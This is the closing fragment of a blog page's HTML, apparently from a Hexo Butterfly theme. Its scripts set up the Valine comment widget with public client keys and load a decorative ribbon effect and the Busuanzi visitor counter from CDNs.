      window.shuoshuoComment.destroyValine = () => {
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }

    const valineConfig = {
      el: '#vcomment',
      appId: 'r0zaRNVTg4O1z7w5iaCB0I0M-gzGzoHsz',
      appKey: 'GrsHd5ymCsIENl0K9Oac5PJr',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      visitor: false,
      ...option,
      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
    }

    new Valine(valineConfig)
  }

  const loadValine = async (el, path) => {
    if (typeof Valine === 'function') {
      initValine(el, path)
    } else {
      await btf.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
      initValine(el, path)
    }
  }

  if (isShuoshuo) {
    'Valine' === 'Valine'
      ? window.shuoshuoComment = { loadComment: loadValine }
      : window.loadOtherComment = loadValine
    return
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>